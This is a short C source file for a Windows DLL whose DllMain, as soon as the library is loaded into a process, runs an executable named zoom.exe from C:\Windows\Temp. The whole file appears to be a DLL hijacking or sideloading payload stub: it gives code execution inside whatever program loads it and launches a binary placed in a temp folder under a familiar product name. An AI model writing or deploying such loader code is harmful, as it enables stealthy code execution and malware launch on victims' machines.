#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        // Path to the zoom.exe
        const char* exePath = "C:\\Windows\\Temp\\zoom.exe";

        // Execute zoom.exe
        if (WinExec(exePath, SW_SHOW) <= 31) {
            MessageBoxA(NULL, "Failed to execute zoom.exe!", "Error", MB_ICONERROR);
        }
        break;
    }
    }
    return TRUE;
}

